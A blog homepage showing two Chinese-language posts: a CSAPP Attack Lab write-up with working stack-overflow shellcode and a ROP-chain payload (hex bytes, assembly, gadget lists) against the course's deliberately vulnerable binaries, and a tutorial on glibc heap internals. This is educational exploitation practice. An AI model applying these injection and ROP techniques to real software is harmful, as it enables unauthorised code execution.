<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"121.36.2.124","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Garen Wang&#39;s Blog">
<meta property="og:url" content="https://121.36.2.124/index.html">
<meta property="og:site_name" content="Garen Wang&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Garen Wang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://121.36.2.124/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Garen Wang's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Garen Wang's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/17/CSAPP-Attack-Lab-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Attack Lab Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-17 11:45:32 / Modified: 15:17:30" itemprop="dateCreated datePublished" datetime="2021-01-17T11:45:32+08:00">2021-01-17</time>
            </span>

          
            <span id="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Attack Lab Writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/17/CSAPP-Attack-Lab-Writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/17/CSAPP-Attack-Lab-Writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><del>最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来</del></p>
<p><code>hex2raw</code>读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。</p>
<p>直接运行<code>ctarget</code>或<code>rtarget</code>会没办法运行，报了个<code>Running on an illegal host</code>的错误。</p>
<p>我们加个<code>-q</code>的参数就能跑了。或者<code>-i</code>然后加上文件名，从文件里读入。</p>
<p>运行的方法是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;ctarget -q</span><br><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;rtarget -q</span><br></pre></td></tr></table></figure>
<h2 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h2><p>这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个<code>Gets</code>函数里面看看汇编其实是没有的。</p>
<p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
<p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
<p>构造shellcode当然先写汇编，有两种写法：</p>
<h4 id="已知cookie再写入"><a href="#已知cookie再写入" class="headerlink" title="已知cookie再写入"></a>已知cookie再写入</h4><p>在<code>cookie.txt</code>里面就有cookie的值，我们只要把这个值赋给rdi就可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>因为是AT&amp;T语法，所以可以直接用<code>gcc -c</code>编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。</p>
<p><code>ret</code>命令相当于一个<code>pop rip</code>，将<code>rip</code>指向了<code>0x4017ec</code>，即调用了<code>touch2</code>。</p>
<p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
<p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
<p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
<h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个要求我们继续利用那个漏洞跳入<code>touch3</code>，顺便携带一个字符串地址，还要跑过<code>hexmatch</code>函数的检测。</p>
<p>我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。</p>
<p>我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。</p>
<p>所以我们要弄到”59b997fa”这段字符串，实际上写入的时候就得写入ASCII码了。</p>
<p>但是不能随便在栈里面随便找个地方存，因为后面执行<code>hexmatch</code>时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。</p>
<p>shellcode部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这里 解释一下：<code>0x5561dca8 = 0x5561dc78 + 0x28 + 0x8</code></p>
<p>把它翻译成机器码，粘在字符串里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
<p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
<h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
<p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
<p>而我们大可直接用ROPgadget来做。。。</p>
<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。</p>
<p>略。</p>
<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>现在就是真正的拼gadget了。</p>
<p>这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。</p>
<p>在看别人博客的时候，看见一个非常非常重要的gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br></pre></td></tr></table></figure>
<p>只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。</p>
<p>开始扫gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;mov|ret&quot;</span><br><span class="line">0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret</span><br><span class="line">0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret</span><br><span class="line">0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret</span><br><span class="line">0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret</span><br><span class="line">0x0000000000402dd7 : mov eax, 0 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;pop|ret&quot;</span><br><span class="line">0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000004011aa : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000401dab : pop rbx ; ret</span><br><span class="line">0x000000000040141b : pop rdi ; ret</span><br><span class="line">0x0000000000402b17 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401383 : pop rsi ; ret</span><br><span class="line">0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000004021d8 : pop rsp ; pop r13 ; ret</span><br><span class="line">0x00000000004018f8 : pop rsp ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<p>（略去了一部分没用的gadget）</p>
<p>我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。</p>
<p>接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。</p>
<p>最后mov到rdi上，就可以跳转到<code>touch3</code>了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00</span><br><span class="line">40 00 00 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/16/glibc-Heap-Learning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/16/glibc-Heap-Learning/" class="post-title-link" itemprop="url">glibc Heap Learning</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-16 22:18:04 / Modified: 23:57:22" itemprop="dateCreated datePublished" datetime="2021-01-16T22:18:04+08:00">2021-01-16</time>
            </span>

          
            <span id="/2021/01/16/glibc-Heap-Learning/" class="post-meta-item leancloud_visitors" data-flag-title="glibc Heap Learning" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/16/glibc-Heap-Learning/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/16/glibc-Heap-Learning/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>学了好几天的堆，今晚把已经看过的堆的知识记录一下。</p>
<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>系统用堆(Heap)来动态管理内存，堆从低地址向高地址生长。</p>
<p>一直听到堆栈的说法，其实堆跟栈区别真的很大的好吧：比如栈从高地址向低地址生长，内存较为固定，地址一直是<code>0x7ffff...</code>开头的，不能跟堆混为一谈吧。</p>
<p>堆的实现就是时间与空间达到权衡(trade off)的生动案例。后面我们会体会到。</p>
<p>堆想要效率高，就应该提高单次分配和释放的速率，同时也要减少内存空间利用的碎片化。</p>
<p>glibc中堆的管理器是ptmalloc2。我们在pwn学堆的时候，就学习ptmalloc2的堆管理。</p>
<h2 id="堆的两个C语言高级函数"><a href="#堆的两个C语言高级函数" class="headerlink" title="堆的两个C语言高级函数"></a>堆的两个C语言高级函数</h2><p>在C++里面是<code>new</code>跟<code>delete</code>，而在C语言里面是<code>malloc</code>跟<code>free</code>。</p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void* malloc(size_t n);</span><br><span class="line">return a pointer to the newly-allocated chunk.</span><br></pre></td></tr></table></figure>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void free(void* p);</span><br><span class="line">release the chunk pointed by the pointer p</span><br></pre></td></tr></table></figure>
<h2 id="堆底层的常用概念"><a href="#堆底层的常用概念" class="headerlink" title="堆底层的常用概念"></a>堆底层的常用概念</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena可以理解为一个区域内的内存集合，可以看作是一片连续的内存空间。</p>
<p>在多线程中，每个线程都有一个专属的arena，主线程的arena就叫<code>main_arena</code>，后续做题经常见到。</p>
<p>主线程的arena通过系统调用<code>sbrk</code>创建，通过<code>brk</code>进行伸缩，其他线程的arena通过<code>mmap</code>来创建。</p>
<p><code>main_arena</code>其实是由一个<code>struct malloc_state</code>来组织的，这个结构体里面储存了多种类型的bin和top chunk等内容。</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk即是<code>malloc</code>和<code>free</code>操作时，内存块的基本单位。</p>
<h4 id="free-chunk的结构"><a href="#free-chunk的结构" class="headerlink" title="free chunk的结构"></a>free chunk的结构</h4><p>一个空闲的chunk不是都是unused area，而是在chunk的头部储存了很多信息，具体是这么储存的：</p>
<ul>
<li>prev_size：储存上一个chunk的size</li>
<li>size：储存当前free chunk的size</li>
<li>fd：下一个free chunk</li>
<li>bk：上一个free chunk</li>
<li>unused area</li>
</ul>
<p>另外，注意到x86-64平台下，chunk都是每8个字节对齐的，所以chunk的大小也一定是8个字节的倍数，所以上面用来表示size的8个字节，就可以保证二进制表示下最后必有3个0。</p>
<p>而这3个0的位置，就被设计来分别储存3个信息：</p>
<ul>
<li>N：NON_MAIN_ARENA，1表示不是main_arena的，0代表是main_arena的。</li>
<li>M：IS_MMAPPED，1代表该chunk是<code>mmap</code>出来的，0则不是。</li>
<li>P：PREV_INUSE，1代表前面的chunk正在被使用，0则代表前面的chunk是空闲的。</li>
</ul>
<h4 id="allocated-chunk的结构"><a href="#allocated-chunk的结构" class="headerlink" title="allocated chunk的结构"></a>allocated chunk的结构</h4><p>allocated chunk的结构跟free chunk大体相似，不过也有不同：</p>
<ul>
<li>prev_size、size、NMP这前两个字段都是跟free chunk一样的。</li>
<li>没有fd和bk，从第三个字段开始即可开始储存数据。</li>
</ul>
<p>注意一下，prev_size到底什么时候有必要？当可以与前面的chunk合并时有必要存在。</p>
<p>什么时候allocated chunk可以省去prev_size这一个字段的空间？当前面的chunk也是allocated的。</p>
<p>所以，在设计之中，allocated chunk之间是可以把prev_size那8个字节也用来存入数据，这样能多出8个字节的存储空间。</p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>top chunk就是一个arena里面最后的那块chunk，不管怎样都会存在，作为一个arena的结束，不输入任何一个bin。</p>
<p>top chunk可以通过系统调用<code>brk</code>来变长变短，也可以在<code>malloc</code>过程中被切出一块去用，但是一直会存在。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bin是用来管理<strong>空闲的chunk</strong>的一个数据结构，通过单向或双向链表来进行组织。</p>
<p>通过将不同类型的chunk放进不同的bin中进行管理，能够提高<code>malloc</code>过程找到合适的chunk的速率。</p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>fast bin维护小型的内存块，将这些小内存块用于系统频繁的小型内存申请调用。</p>
<p>fast bin只有1组，也就是只有一条单向链表来维护。</p>
<p>fast bin中的free chunk有这么几个特点：</p>
<ol>
<li>不与其他的free chunk合并</li>
<li>使用singly linked list进行组织</li>
<li>采用Last In First Out Policy</li>
<li>申请小内存时，最先在fast bin中寻找</li>
<li>当被free时，不会将P位置0（PREV_INUSE）</li>
</ol>
<p>一般0x20到0x7f大小的chunk，在free后并且分类后，会被丢进fast bin进行维护。</p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><p>small bins有62组链表，负责维护相对较小的chunk。</p>
<p>small bins的free chunk就跟fast bin不同了：</p>
<ol>
<li>相同大小的chunk就会被放在同一组small bin之中</li>
<li>使用doubly linked list维护</li>
<li>First In First Out</li>
<li>当被free时，会诚实地记录P位</li>
<li>并且，有条件时，会主动地合并成一个更大的free chunk</li>
</ol>
<p>大小从0x80到0x400的chunk最后会被丢到small bins去维护。（大小小于1M）</p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p>large bins共有63组。每一组large bin储存的不是特定大小的chunk，而是大小处在一定范围的chunk。</p>
<p>记录的方法与small bin几乎相同。一样是FIFO，一样是双向链表，一样会主动合并。</p>
<p>不过有一点特殊：large bin中的chunk是按照从大到小进行排序的。</p>
<p>大于0x400即1M的chunk就会被安排到large bin里面去。</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin可以通俗想象成是chunk的“垃圾桶”，任何大于0x80的chunk都会被丢进unsorted bin里面去。（太小的直接丢进fast bin里面维护）</p>
<p>unsorted bin中的chunk没有大小规定，也没有大小顺序，一切都是待整理状态。</p>
<p>在里面的chunk会通过后续的“捡垃圾”（即chunk维护整理工作）进入到专属的chunk。</p>
<p>与fast bin一样，unsorted bin也只有一组。也只是一个暂存的缓冲区域，该挑合适的chunk，还是去规定的bin找，万不得已最后才来搜垃圾堆嘛。。。</p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>有一个原则：任意两个物理相邻的空闲chunk不能排在一起。（不过fast bin还是得除外的）</p>
